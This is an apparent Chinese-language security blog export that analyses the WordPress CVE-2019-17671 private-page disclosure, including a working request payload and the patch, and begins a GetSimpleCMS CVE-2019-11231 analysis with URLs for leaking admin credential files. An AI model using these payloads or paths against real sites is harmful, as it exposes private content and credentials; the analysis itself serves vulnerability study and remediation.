SC升序排列，尽可能的把最早发布的页面排在\\$this-\\>post[0]，这个\\$this-\\>post[0]大概率是wordpress示例页面或者是网站自行添加的说明页面，其状态大概率是public，因此通过这个技巧绕过了后续登陆校验的环节，直接把所有页面显示出来\n\n我们新建一个私密测试页面，如下图\n\n![MJV5m6.png](https://s2.ax1x.com/2019/11/13/MJV5m6.png)\n\n建立一个回收站页面测试，并把它丢到回收站，如下图\n\n![MY7JG4.png](https://s2.ax1x.com/2019/11/14/MY7JG4.png)\n\n通过我们的payload，可见私密以及回收站的Page都可被查看\n\n![MJVoTO.png](https://s2.ax1x.com/2019/11/13/MJVoTO.png)\n\n若我们没有设置order=asc，则\\$this-\\>post[0]为我最后丢掉回收站里的Page(默认是用发布时间降序排序，而丢到回收站的那篇是我测试时最后新建的),它的状态是trash而非public，因此wordpress触发登陆校验，如下图\n\n![MJZ9AS.png](https://s2.ax1x.com/2019/11/13/MJZ9AS.png)\n\n## 漏洞修复\n\n![MY7tz9.png](https://s2.ax1x.com/2019/11/14/MY7tz9.png)\n\n漏洞修复其实很容易理解：\n\n开发者把\\$public_query_vars数组中的static给删了，这样就算请求中传入static的值，也会被忽略，记得上文http://127.0.0.1/wordpress/?static=0&order=asc&kumamon=test\n\n中的kumamon参数吗？\n\n其次，开发者把’’\n!=\\$qv[‘static’]这个条件也删除了，这样的话，只能通过pagename或者page_id查询单条page了，然而单条page在显示时，是需要验证其状态的，非public的单条page是不予显示的","slug":"CVE-2019-17671","published":1,"updated":"2020-10-27T09:25:29.268Z","_id":"ckgrozu85000bwsa9h87e2e0h","comments":1,"layout":"post","photos":[],"link":"","content":"<p>WordPress在5.2.3版本之前，存在着一处未授权页面查看漏洞，攻击者可以在未授权的情况下，查看所有私密页面或是已经删除至回收站的页面</p>\n<a id=\"more\"></a>\n\n<p>这个漏洞，请注意我的描述用字，是私密页面查看，而非私密文章查看，这点很关键，在wordpress中，POST指的是文章，Page指的是页面，这两个不是同一个概念，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/13/MJZS78.png\" alt=\"MJZS78.png\"></p>\n<p>页面：</p>\n<p>用户可以单独建立一个固定页面，可以作为留言板，或者通知的单页面，发布之后是固定的网址。页面并不能被分类、亦不能拥有标签，但是它们可以有层级关系。可将页面附属在另一个页面之下</p>\n<p>文章：</p>\n<p>文章可以通过标签实现相关文章的链接，可以放评论和评论框来实现与用户的互动，页面没有。文章有栏目可以归档，还有标签，页面没有。编辑文章时可选不同的形式，页面没有。</p>\n<p>利用这个漏洞，攻击者并不能查看未发布的文章，只能有一定几率查看私密或已以至回收站的页面</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>我们将自上而下，从wordpress入口到漏洞触发点，来分析该漏洞</p>\n<p>首先来看位于\\wp-includes\\class-wp.php 中的WP类，该类为WordPress环境设置类</p>\n<p>在WP类中，存在$public_query_vars数组，该数组用来定义公共查询变量，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/14/MYH2hF.png\" alt=\"MYH2hF.png\"></p>\n<p>在WP类中，存在main方法，该方法用来设置WordPress环境所需的所有变量，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/14/MY73IU.png\" alt=\"MY73IU.png\"></p>\n<p>Wordpress启动时，会调用WP类中的main方法，进行环境遍历赋值，位于上图main方法737行处，可见调用parse_request方法</p>\n<p>parse_request方法的作用是，解析请求(GET/POST)以找到正确的WordPress查询，根据请求设置查询变量。如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/13/MJVO1A.png\" alt=\"MJVO1A.png\"></p>\n<p>该方法中存在一处foreach循环，遍历WP类中定义的$public_query_vars数组值，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/13/MJZeBV.png\" alt=\"MJZeBV.png\"></p>\n<p>该处循环的作用，是寻找$public_query_vars数组中的值，是否存在于GET/POST请求的参数中，如过在请求的参数中找到，就将其参数键与值赋值到WP环境变量中去，$public_query_vars数组见上文</p>\n<p>例如有如下payload请求</p>\n<p><a href=\"http://127.0.0.1/wordpress/?static=0&amp;order=asc&amp;kumamon=test\">http://127.0.0.1/wordpress/?static=0&amp;order=asc&amp;kumamon=test</a></p>\n<p>$public_query_vars数组中存在”order”与” static”</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/13/MJVI0K.png\" alt=\"MJVI0K.png\"></p>\n<p>而GET请求的参数中也存在这两个参数，于是程序会将GET中order与static的值赋值给$this-&gt;query_vars[‘order’]与$this-&gt;query_vars[‘static]，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/13/MJV7kD.png\" alt=\"MJV7kD.png\"></p>\n<p>$public_query_vars数组中并无”kumamon”，因此GET请求中的kumamon变量不做处理</p>\n<p>Wordpress的环境变量机制了解完毕后，接下来看下漏洞触发点</p>\n<p>首先来看下</p>\n<p>\\wp-includes\\class-wp-query.php中的parse_query方法</p>\n<p>该方法也是在wordpress启动时入口处被一系列的调用加载进来的,执行顺序位于parse_request方法之后，也就是环境变量赋值之后</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/14/MY7YRJ.png\" alt=\"MY7YRJ.png\"></p>\n<p>我们重点关注下$qv变量，如下图红框处</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/13/MJZm7T.png\" alt=\"MJZm7T.png\"></p>\n<p>该变量为$this-&gt;query_vars引用而来的，而$this-&gt;query_vars则是$this-&gt;query_vars经过fill_query_vars方法处理之后的值</p>\n<p>当我们的请求为<a href=\"http://127.0.0.1/wordpress/?static=0&amp;order=asc\">http://127.0.0.1/wordpress/?static=0&amp;order=asc</a></p>\n<p>$this-&gt;query_vars值如下，该值由parse_request方法得来</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/13/MJVHte.png\" alt=\"MJVHte.png\"></p>\n<p>而fill_query_vars方法，是将其他并未从请求中传递与赋值的环境变量用空值赋值</p>\n<p>我们这里仅仅通过请求赋值了static与order两个环境变量，因此$this-&gt;query_vars值如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/13/MJVjXt.png\" alt=\"MJVjXt.png\"></p>\n<p>$qv为$this-&gt;query_vars引用，因此其中值与上图一致</p>\n<p>接下来，位于805行处，有如下if-else条件</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/13/MJVX6I.png\" alt=\"MJVX6I.png\"></p>\n<p>由于我们通过GET请求传入static变量，已经将$qv[‘static’]赋值为0，因此可以进入上图条件分支，使得$this-&gt;is_page=true,<br>$this-&gt;is_single=false</p>\n<p>还记得之前所说，Page指的是页面吗？因此上文的这个if条件，是为了通过检查请求中是否有’static’、’pagename’、’page_id’值，来判断是否要进行页面(Page)处理，如果是，则将$this-&gt;is_page设置为true</p>\n<p>继续向下看，位于3043行处，存在如下if条件分支</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/13/MJVbfH.png\" alt=\"MJVbfH.png\"></p>\n<p>此时$this-&gt;is_page=true, $this-&gt;is_single=false，所以if中(<br>$this-&gt;is_single || $this-&gt;is_page )处的值为true。</p>\n<p>只要使得$this-&gt;posts不为空，则可以进入此处if分支</p>\n<p>$this-&gt;posts值为如下sql语句的查询值</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/14/MY7Krq.png\" alt=\"MY7Krq.png\"></p>\n<p>这里解释下，为什么sql语句WHERE中wp_posts.post_type = ‘page’ 且ORDER BY<br>wp_posts.post_date ASC</p>\n<p>首先看下wp_posts.post_type = ‘page’</p>\n<p>由于上文设置了$this-&gt;is_page=true，因此进入如下条件分支</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/13/MJZAcn.png\" alt=\"MJZAcn.png\"></p>\n<p>此处设置了查询条件为wp_posts.post_type =<br>‘page’。显然，$this-&gt;is_page=true，是要在库中查找page类型的发布</p>\n<p>ORDER BY wp_posts.post_date<br>ASC的原因是由于我们GET请求中传入的order参数为ASC，其order为环境变量，在这里被直接拿来拼接sql语句了</p>\n<p>在了解了wordpress此时的查询语句，我们对照后台数据库中wp_posts表的内容分析下</p>\n<p>wp_posts表中存储了wordpress所有发布的内容，并同过post_type对其进行类型区分</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/13/MJVLpd.png\" alt=\"MJVLpd.png\"></p>\n<p>Post_type 为post的，代表其为文章(POST)；而page，代表这是一个页面</p>\n<p>因此我们的$this-&gt;is_page=true，使得程序从该中查询所有page类型的发布内容，也就是说，把所有的页面都提取出来了</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/13/MJZZn0.png\" alt=\"MJZZn0.png\"></p>\n<p>注意这里：这条查询，把所有的page都查询出来，不管其状态是发布(publish)或是private(私密)甚至是回收站(trash)。并且通过发布时间升序排列，至于需要设置升序排列的原因，后文会介绍。</p>\n<p>继续回到漏洞点</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/13/MJZuAU.png\" alt=\"MJZuAU.png\"></p>\n<p>此时我们已经搞清楚$this-&gt;posts是什么了，如上文所说，$this-&gt;posts存放着从wp_posts表中取出的所有页面(Page)，并且通过时间顺序升序排列</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/13/MJZEXq.png\" alt=\"MJZEXq.png\"></p>\n<p>这时候$this-&gt;post[0]即为存放在数据库中最早发布的那篇页面(Page)，由于我的示范页面没有删，所以这里的$this-&gt;post[0]就是那篇示范页面</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/13/MJVz0f.png\" alt=\"MJVz0f.png\"></p>\n<p>而$this-&gt;post[2]就是我们的私密的页面，如下图，可见post_status为private</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/13/MJVxnP.png\" alt=\"MJVxnP.png\"></p>\n<p>为什么要用ASC将我们最早发布的页面放在$this-&gt;post[0]位置呢？原因如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/14/MY71aT.png\" alt=\"MY71aT.png\"></p>\n<p>程序会检查$this-&gt;post[0]的发布状态，如上图前两个红框，并判断$this-&gt;post[0]的发布状态是否是public，若$this-&gt;post[0]的发布状态不为public，则接下来进行登陆与身份验证</p>\n<p>因此通过ASC升序排列，尽可能的把最早发布的页面排在$this-&gt;post[0]，这个$this-&gt;post[0]大概率是wordpress示例页面或者是网站自行添加的说明页面，其状态大概率是public，因此通过这个技巧绕过了后续登陆校验的环节，直接把所有页面显示出来</p>\n<p>我们新建一个私密测试页面，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/13/MJV5m6.png\" alt=\"MJV5m6.png\"></p>\n<p>建立一个回收站页面测试，并把它丢到回收站，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/14/MY7JG4.png\" alt=\"MY7JG4.png\"></p>\n<p>通过我们的payload，可见私密以及回收站的Page都可被查看</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/13/MJVoTO.png\" alt=\"MJVoTO.png\"></p>\n<p>若我们没有设置order=asc，则$this-&gt;post[0]为我最后丢掉回收站里的Page(默认是用发布时间降序排序，而丢到回收站的那篇是我测试时最后新建的),它的状态是trash而非public，因此wordpress触发登陆校验，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/13/MJZ9AS.png\" alt=\"MJZ9AS.png\"></p>\n<h2 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h2><p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/14/MY7tz9.png\" alt=\"MY7tz9.png\"></p>\n<p>漏洞修复其实很容易理解：</p>\n<p>开发者把$public_query_vars数组中的static给删了，这样就算请求中传入static的值，也会被忽略，记得上文<a href=\"http://127.0.0.1/wordpress/?static=0&amp;order=asc&amp;kumamon=test\">http://127.0.0.1/wordpress/?static=0&amp;order=asc&amp;kumamon=test</a></p>\n<p>中的kumamon参数吗？</p>\n<p>其次，开发者把’’<br>!=$qv[‘static’]这个条件也删除了，这样的话，只能通过pagename或者page_id查询单条page了，然而单条page在显示时，是需要验证其状态的，非public的单条page是不予显示的</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>WordPress在5.2.3版本之前，存在着一处未授权页面查看漏洞，攻击者可以在未授权的情况下，查看所有私密页面或是已经删除至回收站的页面</p>","more":"<p>这个漏洞，请注意我的描述用字，是私密页面查看，而非私密文章查看，这点很关键，在wordpress中，POST指的是文章，Page指的是页面，这两个不是同一个概念，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/13/MJZS78.png\" alt=\"MJZS78.png\"></p>\n<p>页面：</p>\n<p>用户可以单独建立一个固定页面，可以作为留言板，或者通知的单页面，发布之后是固定的网址。页面并不能被分类、亦不能拥有标签，但是它们可以有层级关系。可将页面附属在另一个页面之下</p>\n<p>文章：</p>\n<p>文章可以通过标签实现相关文章的链接，可以放评论和评论框来实现与用户的互动，页面没有。文章有栏目可以归档，还有标签，页面没有。编辑文章时可选不同的形式，页面没有。</p>\n<p>利用这个漏洞，攻击者并不能查看未发布的文章，只能有一定几率查看私密或已以至回收站的页面</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>我们将自上而下，从wordpress入口到漏洞触发点，来分析该漏洞</p>\n<p>首先来看位于\\wp-includes\\class-wp.php 中的WP类，该类为WordPress环境设置类</p>\n<p>在WP类中，存在$public_query_vars数组，该数组用来定义公共查询变量，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/14/MYH2hF.png\" alt=\"MYH2hF.png\"></p>\n<p>在WP类中，存在main方法，该方法用来设置WordPress环境所需的所有变量，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/14/MY73IU.png\" alt=\"MY73IU.png\"></p>\n<p>Wordpress启动时，会调用WP类中的main方法，进行环境遍历赋值，位于上图main方法737行处，可见调用parse_request方法</p>\n<p>parse_request方法的作用是，解析请求(GET/POST)以找到正确的WordPress查询，根据请求设置查询变量。如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/13/MJVO1A.png\" alt=\"MJVO1A.png\"></p>\n<p>该方法中存在一处foreach循环，遍历WP类中定义的$public_query_vars数组值，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/13/MJZeBV.png\" alt=\"MJZeBV.png\"></p>\n<p>该处循环的作用，是寻找$public_query_vars数组中的值，是否存在于GET/POST请求的参数中，如过在请求的参数中找到，就将其参数键与值赋值到WP环境变量中去，$public_query_vars数组见上文</p>\n<p>例如有如下payload请求</p>\n<p><a href=\"http://127.0.0.1/wordpress/?static=0&amp;order=asc&amp;kumamon=test\">http://127.0.0.1/wordpress/?static=0&amp;order=asc&amp;kumamon=test</a></p>\n<p>$public_query_vars数组中存在”order”与” static”</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/13/MJVI0K.png\" alt=\"MJVI0K.png\"></p>\n<p>而GET请求的参数中也存在这两个参数，于是程序会将GET中order与static的值赋值给$this-&gt;query_vars[‘order’]与$this-&gt;query_vars[‘static]，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/13/MJV7kD.png\" alt=\"MJV7kD.png\"></p>\n<p>$public_query_vars数组中并无”kumamon”，因此GET请求中的kumamon变量不做处理</p>\n<p>Wordpress的环境变量机制了解完毕后，接下来看下漏洞触发点</p>\n<p>首先来看下</p>\n<p>\\wp-includes\\class-wp-query.php中的parse_query方法</p>\n<p>该方法也是在wordpress启动时入口处被一系列的调用加载进来的,执行顺序位于parse_request方法之后，也就是环境变量赋值之后</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/14/MY7YRJ.png\" alt=\"MY7YRJ.png\"></p>\n<p>我们重点关注下$qv变量，如下图红框处</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/13/MJZm7T.png\" alt=\"MJZm7T.png\"></p>\n<p>该变量为$this-&gt;query_vars引用而来的，而$this-&gt;query_vars则是$this-&gt;query_vars经过fill_query_vars方法处理之后的值</p>\n<p>当我们的请求为<a href=\"http://127.0.0.1/wordpress/?static=0&amp;order=asc\">http://127.0.0.1/wordpress/?static=0&amp;order=asc</a></p>\n<p>$this-&gt;query_vars值如下，该值由parse_request方法得来</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/13/MJVHte.png\" alt=\"MJVHte.png\"></p>\n<p>而fill_query_vars方法，是将其他并未从请求中传递与赋值的环境变量用空值赋值</p>\n<p>我们这里仅仅通过请求赋值了static与order两个环境变量，因此$this-&gt;query_vars值如下</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/13/MJVjXt.png\" alt=\"MJVjXt.png\"></p>\n<p>$qv为$this-&gt;query_vars引用，因此其中值与上图一致</p>\n<p>接下来，位于805行处，有如下if-else条件</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/13/MJVX6I.png\" alt=\"MJVX6I.png\"></p>\n<p>由于我们通过GET请求传入static变量，已经将$qv[‘static’]赋值为0，因此可以进入上图条件分支，使得$this-&gt;is_page=true,<br>$this-&gt;is_single=false</p>\n<p>还记得之前所说，Page指的是页面吗？因此上文的这个if条件，是为了通过检查请求中是否有’static’、’pagename’、’page_id’值，来判断是否要进行页面(Page)处理，如果是，则将$this-&gt;is_page设置为true</p>\n<p>继续向下看，位于3043行处，存在如下if条件分支</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/13/MJVbfH.png\" alt=\"MJVbfH.png\"></p>\n<p>此时$this-&gt;is_page=true, $this-&gt;is_single=false，所以if中(<br>$this-&gt;is_single || $this-&gt;is_page )处的值为true。</p>\n<p>只要使得$this-&gt;posts不为空，则可以进入此处if分支</p>\n<p>$this-&gt;posts值为如下sql语句的查询值</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/14/MY7Krq.png\" alt=\"MY7Krq.png\"></p>\n<p>这里解释下，为什么sql语句WHERE中wp_posts.post_type = ‘page’ 且ORDER BY<br>wp_posts.post_date ASC</p>\n<p>首先看下wp_posts.post_type = ‘page’</p>\n<p>由于上文设置了$this-&gt;is_page=true，因此进入如下条件分支</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/13/MJZAcn.png\" alt=\"MJZAcn.png\"></p>\n<p>此处设置了查询条件为wp_posts.post_type =<br>‘page’。显然，$this-&gt;is_page=true，是要在库中查找page类型的发布</p>\n<p>ORDER BY wp_posts.post_date<br>ASC的原因是由于我们GET请求中传入的order参数为ASC，其order为环境变量，在这里被直接拿来拼接sql语句了</p>\n<p>在了解了wordpress此时的查询语句，我们对照后台数据库中wp_posts表的内容分析下</p>\n<p>wp_posts表中存储了wordpress所有发布的内容，并同过post_type对其进行类型区分</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/13/MJVLpd.png\" alt=\"MJVLpd.png\"></p>\n<p>Post_type 为post的，代表其为文章(POST)；而page，代表这是一个页面</p>\n<p>因此我们的$this-&gt;is_page=true，使得程序从该中查询所有page类型的发布内容，也就是说，把所有的页面都提取出来了</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/13/MJZZn0.png\" alt=\"MJZZn0.png\"></p>\n<p>注意这里：这条查询，把所有的page都查询出来，不管其状态是发布(publish)或是private(私密)甚至是回收站(trash)。并且通过发布时间升序排列，至于需要设置升序排列的原因，后文会介绍。</p>\n<p>继续回到漏洞点</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/13/MJZuAU.png\" alt=\"MJZuAU.png\"></p>\n<p>此时我们已经搞清楚$this-&gt;posts是什么了，如上文所说，$this-&gt;posts存放着从wp_posts表中取出的所有页面(Page)，并且通过时间顺序升序排列</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/13/MJZEXq.png\" alt=\"MJZEXq.png\"></p>\n<p>这时候$this-&gt;post[0]即为存放在数据库中最早发布的那篇页面(Page)，由于我的示范页面没有删，所以这里的$this-&gt;post[0]就是那篇示范页面</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/13/MJVz0f.png\" alt=\"MJVz0f.png\"></p>\n<p>而$this-&gt;post[2]就是我们的私密的页面，如下图，可见post_status为private</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/13/MJVxnP.png\" alt=\"MJVxnP.png\"></p>\n<p>为什么要用ASC将我们最早发布的页面放在$this-&gt;post[0]位置呢？原因如下</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/14/MY71aT.png\" alt=\"MY71aT.png\"></p>\n<p>程序会检查$this-&gt;post[0]的发布状态，如上图前两个红框，并判断$this-&gt;post[0]的发布状态是否是public，若$this-&gt;post[0]的发布状态不为public，则接下来进行登陆与身份验证</p>\n<p>因此通过ASC升序排列，尽可能的把最早发布的页面排在$this-&gt;post[0]，这个$this-&gt;post[0]大概率是wordpress示例页面或者是网站自行添加的说明页面，其状态大概率是public，因此通过这个技巧绕过了后续登陆校验的环节，直接把所有页面显示出来</p>\n<p>我们新建一个私密测试页面，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/13/MJV5m6.png\" alt=\"MJV5m6.png\"></p>\n<p>建立一个回收站页面测试，并把它丢到回收站，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/14/MY7JG4.png\" alt=\"MY7JG4.png\"></p>\n<p>通过我们的payload，可见私密以及回收站的Page都可被查看</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/13/MJVoTO.png\" alt=\"MJVoTO.png\"></p>\n<p>若我们没有设置order=asc，则$this-&gt;post[0]为我最后丢掉回收站里的Page(默认是用发布时间降序排序，而丢到回收站的那篇是我测试时最后新建的),它的状态是trash而非public，因此wordpress触发登陆校验，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/13/MJZ9AS.png\" alt=\"MJZ9AS.png\"></p>\n<h2 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h2><p><img src=\"https://s2.ax1x.com/2019/11/14/MY7tz9.png\" alt=\"MY7tz9.png\"></p>\n<p>漏洞修复其实很容易理解：</p>\n<p>开发者把$public_query_vars数组中的static给删了，这样就算请求中传入static的值，也会被忽略，记得上文<a href=\"http://127.0.0.1/wordpress/?static=0&amp;order=asc&amp;kumamon=test\">http://127.0.0.1/wordpress/?static=0&amp;order=asc&amp;kumamon=test</a></p>\n<p>中的kumamon参数吗？</p>\n<p>其次，开发者把’’<br>!=$qv[‘static’]这个条件也删除了，这样的话，只能通过pagename或者page_id查询单条page了，然而单条page在显示时，是需要验证其状态的，非public的单条page是不予显示的</p>"},{"title":"GetSimpleCMS-Unauthenticated 远程代码执行漏洞分析","date":"2019-08-21T11:16:31.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nGetSimple是一款基于XML的开源的内容管理系统。Getsimple cms的使用量较为广泛，从官方给出的统计数据来看，GetSimple拥有超过12万次的下载量\n\n在GetSimple 3.3.15版本中，攻击者可以通过伪造管理员cookie，绕过身份验证登陆后台，进而通过后台编辑模板功能模块写入php代码，造成远程代码执行漏洞\n\n<!--more-->\n\n# **0x01 漏洞描述**\n\n* * *\n\n在GetSimple 3.3.15版本中，攻击者可以通过伪造管理员cookie，绕过身份验证登陆后台，进而通过后台编辑模板功能模块写入php代码，造成远程代码执行漏洞。\n\nMetasploit针对此次漏洞，也推出相应的利用插件\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/840316b19ec09e23988648334c42d0fd.png)\n\n详情可见packet storm链接：\n\nhttps://packetstormsecurity.com/files/152961/GetSimpleCMS-3.3.15-Remote-Code-Execution.html\n\n&nbsp;\n\n&nbsp;\n\n# **0x02 受影响的系统版本**\n\n* * *\n\nGetSimple&lt;=3.3.15\n\n&nbsp;\n\n&nbsp;\n\n# **0x03 漏洞编号**\n\n* * *\n\nCVE-2019-11231\n\n&nbsp;\n\n&nbsp;\n\n# **0x04 漏洞分析**\n\n* * *\n\n在分析该漏洞前，不得不提.htaccess文件，本次漏洞的产生，是因为默认情况下apache对.htaccess配置文件的开启情况不同而产生的。\n\nhtaccess文件是Apache服务器中的配置文件，它负责相关目录下的网页配置。通过配置htaccess文件，可以实现众多功能，例如：允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等。\n\n启用.htaccess，需要在apache配置文件中，启用AllowOverride。\n\n在笔者测试了两款环境，分别为配置了wamp的windows与ubuntu服务器，在这两个环境中，默认情况对htaccess文件的启用情况是不同的。\n\n先来看安装有wamp的windows环境，打开apahce配置文件httpd.conf\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/33fb548acfc58b7ac5717900e039b927.png)\n\n可以看到，这里将位于conf/extra/httpd-vhosts.conf文件导入\n\n跟进 httpd-vhosts.conf文件\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/d5dc1155047ddd9cfd276ee555973bbf.png)\n\n可以看到，在这里，默认情况下 AllowOverride 默认值是All\n\n当AllowOverride指令设置为 All时，所有具有\".htaccess\"作用域的指令都允许出现在.htaccess文件中。\n\n此时，目录中的.htaccess配置文件为启用状态\n\n例如位于getsimplecms/data目录中的.htaccess配置文件\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/8710c3b580348616abb6b1c5f29926be.png)\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/4ff4202d805ac20f20a4ab3f3c4cee13.png)\n\n&nbsp;\n\n当此.htaccess配置文件被加载时，是禁止该目录被web端访问的\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/425cc108ea9cafb4e56ff37e536667b9.png)\n\n也就是说，通过该方法，通过web端访问data目录时，不会显示其中文件列表\n\n与其中文件内容，是可以很好的保护存在于该目录下的文件，不被泄露\n\n但是在笔者的ubuntu服务器，ubuntu apache2.conf中\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/92371b4bbd1d1215aed845ef903abf85.png)\n\nAllowOverride 默认值是None，默认的情况下，不加载目录中的.htaccess\n\n我们将上述的.htaccess文件放入ubuntu服务器的web目录中\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/1caa4a8eedb5684f9319d60b63a6aad9.png)\n\n再通过浏览器访问这个路径\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/9474c387505faf554297a061b63d9922.png)\n\n如上图可见，.htaccess并没有生效，而路径中的文件，是可以被泄露的\n\n回归到本次漏洞：\n\n访问http://127.0.0.1/getsimplecms/data/users/admin.xml\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/f51ce9b10a60cc6bfef5dcbe4b4429a2.png)\n\n在.htaccess没有生效的情况下，我们获取admin.xml中记录的用户相关信息，该cms并没有将用户信息写入数据库，而是全部存于该文件中\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/d7e8b50b48d916e31bdc0f34eb294c00.png)\n\n访问http://127.0.0.1/getsimplecms/data/other/authorization.xml获取authorization.xml中记录的apikey\n\n现在我们得到如下的信息：（用户名/加密后的密码/apikey）\n\n该cms并没有将用户信息写入数据库，而是全部存于xml文件中\n\n通过获取的信息，接下来进一步分析如何利用这些泄露的信息：\n\n&nbsp;\n\n**Cookie****算法分析：**\n\n分析下GetSimple中的cookie是如何生成的\n\n位于\\GetSimpleCMS\\admin\\inc\\cookie_functions.php\n\ncreate_cookie方法\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/71cf338a24e2f5d299a6a0bf17eee8d7.png)\n\n计算cookie所需的$USR $SALT 